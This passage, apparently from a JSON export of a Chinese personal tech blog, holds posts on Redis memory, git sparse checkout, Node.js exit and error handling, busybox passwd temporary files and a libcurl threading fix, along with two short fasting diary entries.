1\"\n</pre>\n\n<p>\n重启程序释放资源后系统开始正常响应，但是10多分钟后系统再次无响应，才想起一则经验教训：\n</p>\n\n<pre class=\"example\">\n     跑redis的机器至少要预留和redis占用内存同样大小的空闲内存空间，redis RDB持久化进行fork时最坏会占用双倍内存，内存不足就会动用交换分区，系统性能急剧下降。\n</pre>\n\n<p>\n于是，立即改配置将redis所在机器上的node.js cluster进程数调小，腾出大把内存，总算没有再出现问题，今晚终于可以入眠。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">更多疑问</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<ul class=\"org-ul\">\n<li>我们的node.js进程为什么常常会占用很多内存？\n</li>\n\n<li>netstat中看到CLOSE_WAIT状态的连接输入缓冲往往有数据，而ESTABLISHED状态的连接读写缓冲区往往为空，为什么？\n</li>\n\n<li>node.js卡顿时forever杀不死反而启动了新实例帮倒忙，pm2就一定能够解决吗？\n</li>\n\n<li>redis持久化引起服务挂掉，已经是在第二个项目中遇到了，终极解决方案是什么？\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "升级redis到最新版本的过程",
  "timestamp": "2015-08-10 17:56:00",
  "tags": [
    "redis"
  ],
  "body": "<ul class=\"org-ul\">\n<li>编译最新版本的redis，暂不要安装\n\n<p>\n参见《<a href=\"http:7f168bd15b8988c5-redis.html\">编译安装redis</a>》\n</p>\n</li>\n\n<li>将旧版的redis.conf配置文件中的配置项合入新版本redis.conf\n\n<p>\n可能需要提前确认一下新版本redis是否兼容旧版本数据文件。\n</p>\n</li>\n\n<li>卸载并停止旧版本redis\n</li>\n\n<li>安装新版本redis\n\n<p>\n参见《<a href=\"http:7f168bd15b8988c5-redis.html\">编译安装redis</a>》\n</p>\n</li>\n\n<li>启动新版本redis\n</li>\n</ul>\n"
},
{
  "title": "linux下编程获取/etc/resolv.conf中的域名解析服务器",
  "timestamp": "2015-08-14 18:01:00",
  "tags": [
    "linux",
    "c"
  ],
  "body": "<p>\n直接上代码吧：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\"><span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;unistd.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;sys/types.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;netinet/in.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;arpa/inet.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;arpa/nameser.h&gt;</span>\n<span style=\"color: #cc99cc;\">#include</span> <span style=\"color: #66cccc;\">&lt;resolv.h&gt;</span>\n\n<span style=\"color: #6699cc;\">int</span> <span style=\"color: #f99157;\">main</span>(<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">argc</span>, <span style=\"color: #6699cc;\">char</span> *<span style=\"color: #ffcc66;\">argv</span>[])\n{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">struct</span> <span style=\"color: #6699cc;\">__res_state</span> <span style=\"color: #ffcc66;\">res</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   res.options &amp;= ~ RES_INIT;\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">err</span> = res_ninit(&amp;res);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fprintf(stderr, <span style=\"color: #66cccc;\">\"res_init error: %d\\n\"</span>, err);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> err;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">char</span> <span style=\"color: #ffcc66;\">ip</span>[16];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">for</span>(<span style=\"color: #6699cc;\">int</span> <span style=\"color: #ffcc66;\">i</span> = 0 ; i &lt; res.nscount; ++i) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ip[0] = <span style=\"color: #66cccc;\">'\\0'</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (<span style=\"color: #6699cc;\">!</span> inet_ntop(AF_INET, &amp;res.nsaddr_list[i].sin_addr, ip, <span style=\"color: #99cc99;\">sizeof</span>(ip))) <span style=\"text-decoration: underline;\">{</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   perror(<span style=\"color: #66cccc;\">\"inet_ntop\"</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">continue</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   printf(<span style=\"color: #66cccc;\">\"ip: %s\\n\"</span>, ip);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   res_nclose(&amp;res);\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> 0;\n}\n</pre>\n</div>\n\n<ul class=\"org-ul\">\n<li>参考\n\n<p>\n《<a href=\"http://stackoverflow.com/questions/2916675/programmatically-obtain-dns-servers-of-host\">Programmatically obtain DNS servers of host</a>》</p>\n</li>\n</ul>\n"
},
{
  "title": "轻断食日（2015-8-25）",
  "timestamp": "2015-08-25 14:43:00",
  "tags": [
    "轻断食"
  ],
  "body": "<p>\n今天是轻断食日，感觉很自然，早上给小孩喂饭时也没有顺便吃一点，体重已经稳定在64-65公斤，最近几周已经调整为一周一天断食，目前的体重已经比较合理，等肌肉结实一点再恢复到一周二天断食继续减轻一些体重，仍然用的是前一天晚餐和第二天早餐不吃的方法，断食时间大部分在睡觉容易施行。\n</p>\n\n<p>\nCheers!</p>\n"
},
{
  "title": "拉取git仓库的子目录",
  "timestamp": "2015-08-26 18:17:00",
  "tags": [
    "git"
  ],
  "body": "<p>\n我们的git仓库目录结构：\n</p>\n\n<pre class=\"example\">\nhttp://server/company.git +\n                          |\n                          +- project1\n                          |\n                          +- project2\n                          |\n                          +- project3\n                          |\n                          +- ...\n</pre>\n\n<p>\n以前使用svn的时候是可以直接拉取其中一个子项目，像下面这样：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">svn checkout http://server/company.git/project1\n</pre>\n</div>\n\n<p>\n但是git好像不支持这种用法，网上找了一下相关资料，可以借助git的 <code>Sparse checkout</code> 实现：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">git clone http://server/company.git --no-checkout\n<span style=\"color: #cc99cc;\">cd</span> company\ngit config core.sparsecheckout true\n<span style=\"color: #cc99cc;\">echo</span> <span style=\"color: #66cccc;\">\"project1/\"</span> &gt; .git/info/sparse-checkout\ngit checkout --\n<span style=\"color: #cc99cc;\">cd</span> ..\nln -s company/project1 ./\n</pre>\n</div>\n\n<ul class=\"org-ul\">\n<li>参考\n\n<p>\n《<a href=\"http://stackoverflow.com/questions/4114887/is-it-possible-to-do-a-sparse-checkout-without-checking-out-the-whole-repository\">Is it possible to do a sparse checkout without checking out the whole repository first?</a>》</p>\n</li>\n</ul>\n"
},
{
  "title": "process.exit导致的控制台输出不全",
  "timestamp": "2015-08-27 17:03:00",
  "tags": [
    "node"
  ],
  "body": "<ul class=\"org-ul\">\n<li>先上案例程序：\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">for</span>(<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">i</span> = 0; i &lt; 10000; ++i) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.log(<span style=\"color: #66cccc;\">\"this is long long long long long long long long long long long </span><span style=\"color: #66cccc; text-decoration: underline;\">long long long long long long long long long long long long long long long long long long log \"</span><span style=\"text-decoration: underline;\"> + i);</span>\n}\nprocess.exit(0);\n</pre>\n</div>\n\n<p>\n这个程序输出10000行日志，然后结束进程。\n</p>\n</li>\n\n<li><code>Emacs Shell</code> 以及 <code>GNOME Terminal</code> 下运行结果（省略中间部分输出）：\n\n<pre class=\"example\">\n$ node /home/tangxinfa/Examples/test_exit.js\nthis is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 0\n...\nthis is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 119\n$\n</pre>\n\n<p>\n程序只输出了前面200行日志。\n</p>\n</li>\n\n<li>按 <code>Ctrl+Alt+F2</code> 进入2号系统终端下运行结果（省略中间部分输出）：\n\n<pre class=\"example\">\n$ node /home/tangxinfa/Examples/test_exit.js\nthis is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 0\n...\nthis is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 9999\n$\n</pre>\n\n<p>\n程序输出了完整的日志。\n</p>\n</li>\n\n<li>日志重定向到文件时 <code>Emacs Shell</code> 以及 <code>GNOME Terminal</code> 下运行结果（省略中间部分输出）：\n\n<pre class=\"example\">\n$ node /home/tangxinfa/Examples/test_exit.js &gt; /tmp/test_exit.log\n$ tail -1 /tmp/test_exit.log\nthis is long long long long long long long long long long long long long long long long long long long long long long long long long long long long long log 9999\n$\n</pre>\n\n<p>\n程序输出了完整的日志。\n</p>\n</li>\n\n<li>原因\n\n<p>\n如果输出目标为终端（ <code>Emacs Shell</code> 以及 <code>GNOME Terminal</code> 并非真正的终端）或文件时，console函数是同步的（避免程序过早退出导致丢消息），目标为管道时则为异步（避免长时间堵塞）。\n</p>\n\n<blockquote>\n<p>\nThe console functions are synchronous when the destination is a terminal or a file (to avoid lost messages in case of premature exit) and asynchronous when it's a pipe (to avoid blocking for long periods of time).\n</p>\n</blockquote>\n\n<p>\n参考：《<a href=\"http://stackoverflow.com/questions/18748164/process-exit0-output-disappears\">process.exit(0): output disappears?</a>》\n</p>\n</li>\n\n<li>解决方案\n\n<p>\n调用 <code>process.exit</code> 时确保输出完毕，封装如下：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span class=\"linenr\">1: </span><span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">Safe exit. Makesure log output flushed to console.</span>\n<span class=\"linenr\">2: </span><span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">exit</span>(<span style=\"color: #ffcc66;\">code</span>) {\n<span class=\"linenr\">3: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.stdout.write(<span style=\"color: #66cccc;\">''</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span id=\"coderef-stderr-write\" class=\"coderef-off\"><span class=\"linenr\">4: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.stderr.write(<span style=\"color: #66cccc;\">''</span>, <span style=\"color: #99cc99;\">function</span> () {</span>\n<span class=\"linenr\">5: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.exit(code);\n<span class=\"linenr\">6: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n<span class=\"linenr\">7: </span><span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n<span class=\"linenr\">8: </span>}\n</pre>\n</div>\n\n<p>\n注意，上面的 <code>exit</code> 函数不会像 <code>process.exit</code> 一样立即终止程序，请将 <code>process.exit</code> 替换为  <code>return exit</code> 。\n</p>\n\n<p>\n通过 <a href=\"https://github.com/Unitech/pm2\">pm2</a> 运行 node.js 应用时会接管标准输出和错误输出到日志文件，不存在进程退出日志输出丢失的问题，\n由于 <a href=\"https://github.com/Unitech/pm2\">pm2</a> 会改写 process.stdout.write 和 process.stderr.write ，改写后的函数无返回值并忽略传入的回调函数，\n导致前面封装的 exit 函数无效，需要针对 <a href=\"https://github.com/Unitech/pm2\">pm2</a> 做处理：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">Safe exit, Makesure log output flushed to console.</span>\n<span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">PM2 changed process.stderr.write and process.stdout.write's behavior,</span>\n<span style=\"color: #999999; font-style: italic;\">/// </span><span style=\"color: #999999; font-style: italic;\">log output write to file will flushed automatically,</span>\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">exit</span>(<span style=\"color: #ffcc66;\">code</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (<span style=\"color: #99cc99;\">typeof</span>(process.env.pm_id) == <span style=\"color: #66cccc;\">'undefined'</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.stdout.write(<span style=\"color: #66cccc;\">''</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.stderr.write(<span style=\"color: #66cccc;\">''</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.exit(code);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } <span style=\"color: #99cc99;\">else</span> {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   process.exit(code);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n</pre>\n</div>\n</li>\n</ul>\n"
},
{
  "title": "node.js应用错误处理",
  "timestamp": "2015-10-30 18:08:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n先看一个简单的示例：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">app.post(<span style=\"color: #66cccc;\">'/products'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">req</span>, <span style=\"color: #ffcc66;\">res</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   service.add(req.body, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   logger.error(err.toString());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   res.statusCode = 500;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> res.end({error: err.message});\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   res.statusCode = 200;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   res.end();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n}};\n</pre>\n</div>\n\n<p>\n上面的代码能够直接用于产品环境吗？\n</p>\n\n<p>\n对于稍微严谨的产品，答案肯定是 <span class=\"underline\">否</span> 。\n</p>\n\n<p>\n针对 service.add 调用失败提两个疑问：\n</p>\n\n<ul class=\"org-ul\">\n<li>如何根据错误类型给客户端返回不同的响应，以便客户端更人性化（而非简单的弹消息框）？\n</li>\n\n<li>err.message 会不会包含不应该给用户看到的信息？\n</li>\n</ul>\n\n<p>\n我们需要规范化错误类型，进行明确的分类标识，直到最外层的代码能够根据错误对象提供的信息，给客户端返回恰当的响应，\n下面是我能想到的一些基本原则：\n</p>\n\n<ul class=\"org-ul\">\n<li>错误对象拥有统一的接口\n\n<p>\n确保错误对象是一个Error类实例，如需要自定义错误类型，从Error类继承。\n</p>\n</li>\n\n<li>对错误进行命名标识\n\n<p>\n重量级的做法：为每一个错误类型自定义一个错误类。\n轻量级的做法：将Error对象的name属性设置为错误类型标识。\n</p>\n</li>\n\n<li>在恰当的层次将底层Error对象转化为自定义的错误对象\n\n<p>\n对底层返回的原始错误，尽可能在调用栈恰当的层次转化为合适应用层错误对象，但不必强制对所有底层错误进行转换，\n原生的Error对象可以认为是未标识的错误，这种错误可以默认处理（如：给客户端返回HTTP 500错误）。\n</p>\n</li>\n</ul>\n\n<p>\n错误进行分类标识后的使用示例：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">app.post(<span style=\"color: #66cccc;\">'/products'</span>, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">req</span>, <span style=\"color: #ffcc66;\">res</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   service.add(req.body, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">err</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   logger.error(err.toString());\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span> (err.name === <span style=\"color: #66cccc;\">'ProductAlreadyExists'</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   res.statusCode = 400;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } <span style=\"color: #99cc99;\">else</span> {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   err.message = <span style=\"color: #66cccc;\">'&#20869;&#37096;&#38169;&#35823;'</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   res.statusCode = 500;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> res.end({error: err.message});\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   res.statusCode = 200;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   res.end();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n}};\n</pre>\n</div>\n\n<p>\n优雅的错误处理是系统可维护性的重要组成部分，它和代码各部分息息相关，系统成型后很难再引入错误处理，设计系统时应该一开始就将它纳入考虑范围。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>《<a href=\"https://www.joyent.com/developers/node/design/errors\">Error Handling in Nodejs - Developer Center - Joyent</a>》\n\n<p>\n来自Joyent的Node.js错误处理最佳实践\n</p>\n</li>\n\n<li>《<a href=\"https://cnodejs.org/topic/52090bc944e76d216af25f6f\">Node.js下自定义错误类型 - CNode</a>》\n\n<p>\n派生Error类注意事项\n</p>\n</li>\n\n<li>《<a href=\"https://docs.nodejitsu.com/articles/errors/what-is-the-error-object\">What is the error object? - docs.nodejitsu.com</a>》\n\n<p>\nError对象详解\n</p>\n</li>\n\n<li>《<a href=\"http://www.bennadel.com/blog/2828-creating-custom-error-objects-in-node-js-with-error-capturestacktrace.htm\">Creating Custom Error Objects In Node.js With Error.captureStackTrace()</a>》\n\n<p>\n直接可用的自定义Error类方案\n</p>\n</li>\n\n<li><a href=\"https://github.com/jayyvis/extend-error\">extend-error</a>\n\n<p>\n用于扩展Error类的node.js模块\n</p>\n</li>\n\n<li><a href=\"https://github.com/davepacheco/node-verror\">node-verror</a>\n\n<p>\n包裹原始Error对象，并且保证可访问性的node.js模块，Joyent的Node.js错误处理最佳实践中进行了推荐\n</p>\n</li>\n\n<li>《<a href=\"https://github.com/davepacheco/node-verror/issues/15\">Support for custom error types? · Issue #15 · davepacheco/node-verror</a>》\n\n<p>\n<a href=\"https://github.com/davepacheco/node-verror\">node-verror</a> 支持扩展的讨论</p>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "肉肉又长回来了",
  "timestamp": "2015-11-03 17:27:00",
  "tags": [
    "轻断食"
  ],
  "body": "<p>\n早上称了一下体重，到了67.8公斤，停止断食1个多月的成果就是长了5-6斤肉肉。\n</p>\n\n<p>\n轻断食是一种生活方式，果然没有说错。\n</p>\n\n<p>\n今天开始继续一周两断的生活，减下来以后也要维持一周一断才行。</p>\n"
},
{
  "title": "/etc/passwd、/etc/passwd+、/etc/passwd- 文件介绍",
  "timestamp": "2015-11-24 15:58:00",
  "tags": [
    "linux"
  ],
  "body": "<p>\nbusybox下修改密码或创建用户的时候，有时候操作会失败，此时 <code>/etc</code> 目录可能出现 <code>passwd+</code> 、 <code>passwd-</code> 两个文件。\n</p>\n\n<p>\n当出现 <code>/etc/passwd+</code> 文件时，修改密码会耗时几秒钟然后报错：\n</p>\n\n<pre class=\"example\">\n# passwd root\nChanging password for root\nNew password: 123456\n\nRetype password: 123456\n\npasswd: can't create '/etc/passwd+': File exists\npasswd: can't update password file /etc/passwd\n#\n</pre>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">根据 <a href=\"https://svn.mcs.anl.gov/repos/ZeptoOS/trunk/BGP/packages/busybox/src/libbb/update_passwd.c\">update_passwd.c</a> 可以获得以下信息</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li><code>/etc/passwd</code> 用户帐号配置文件\n</li>\n\n<li><code>/etc/passwd+</code> 更新过程中的临时文件\n</li>\n\n<li><code>/etc/passwd-</code> 用户帐号配置文件的备份\n</li>\n</ul>\n\n<p>\n更新密码逻辑：\n</p>\n\n<ul class=\"org-ul\">\n<li>创建 <code>/etc/passwd+</code> 文件\n\n<p>\n如果 <code>/etc/passwd+</code> 文件存在，则会返回错误.\n</p>\n</li>\n\n<li>备份 <code>/etc/passwd</code> 文件到 <code>/etc/passwd-</code>\n</li>\n\n<li>更新后的帐号配置写到 <code>/etc/passwd+</code> 文件\n</li>\n\n<li>将 <code>/etc/passwd+</code> 文件重命名为 <code>/etc/passwd</code>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">经验法则</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li><code>/etc/passwd</code> 文件损坏时，使用备份文件 <code>/etc/passwd-</code> 还原\n</li>\n\n<li><code>/etc/passwd+</code> 文件存在导致无法更新帐号信息，直接删除 <code>/etc/passwd+</code> 文件即可\n</li>\n\n<li>还会存在 <code>/etc/shadow</code> <code>/etc/shadow-</code> <code>/etc/shadow+</code> ，也是同样处理\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "修复libcurl域名解析超时引起的内存越界问题",
  "timestamp": "2015-12-09 14:17:00",
  "tags": [
    "linux",
    "c"
  ],
  "body": "<p>\n程序发布后在一个用户的机器上频繁出现崩溃，最终定位到崩溃来自一个断言失败：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\">assert(pthread_self() != main_thread_id);\n</pre>\n</div>\n\n<p>\n上面这条语句出现在工作线程回调的函数中，竟然发生了工作线程ID和主线程ID相同的怪事，\n观察了运行日志，发现使用libcurl发起HTTP请求如果超时则有很大机率会断言失败导致崩溃，\n在使用libcurl发起HTTP请求的代码块前后输出工作线程ID，工作线程ID出现了变化，\n根据经验很可能是出现了内存越界。\n</p>\n\n<p>\n最终找到了几篇 <code>libcurl</code> 多线程安全相关的文章：\n</p>\n\n<ul class=\"org-ul\">\n<li>《<a href=\"http://blog.csdn.net/balderfan/article/details/7599554\">libcurl 多线程使用注意事项</a>》\n</li>\n\n<li>《<a href=\"http://blog.csdn.net/delphiwcdj/article/details/18284429\">Libcurl多线程crash问题</a>》\n</li>\n</ul>\n\n<p>\n修复步骤总结如下：\n</p>\n\n<ul class=\"org-ul\">\n<li>在主线程起始处初始化 <code>libcurl</code> 库\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\">curl_global_init(CURL_GLOBAL_ALL);\n</pre>\n</div>\n</li>\n\n<li>禁止 <code>libcurl</code> 通过 <code>alarm</code> 实现域名解析超时\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-c\">curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);\n</pre>\n</div>\n\n<p>\n如果不做下面的最后一步， <code>libcurl</code> 上设置的超时都会无效。\n</p>\n</li>\n\n<li>编译 <code>libcurl</code> 时启用 <code>c-ares</code> 或 <code>threaded resolver</code> ，以支持域名解析超时\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">./configure --enable-ares\n</pre>\n</div>\n\n<p>\n或\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">./configure --enable-threaded-resolver\n</pre>\n</div>\n\n<p>\n《<a href=\"http://daniel.haxx.se/blog/2011/04/25/libcurls-name-resolving/\">Asynch resolving in libcurl</a>》对 <code>c-ares</code> 或 <code>threaded resolver</code> 两种方式进行了比较，简而言之：\n</p>\n\n<ul class=\"org-ul\">\n<li><code>c-ares</code> 是一个异步的域名解析库，开销更少，但是它并非使用系统原生的方式实现，对于定制系统（如：hosts或resolv.conf不在标准位置）可能会有问题。\n</li>\n\n<li><code>threaded resolver</code> 每次域名解析都会开一个线程，解析完成后销毁线程，开销会大一些，但是稳定性、兼容性更好。\n</li>\n</ul>\n</li>\n</ul>\n\n<p>\n按照上面的步骤启用 <code>c-ares</code> 进行修改后程序运行了一整天，没有再崩溃。</p>\n"
},
{
  "title": "Archlinux下安装运行docker",
  "timestamp": "2015-12-09 23:07:00",
  "tags": [
    "archlinux",
    "docker"
  ],
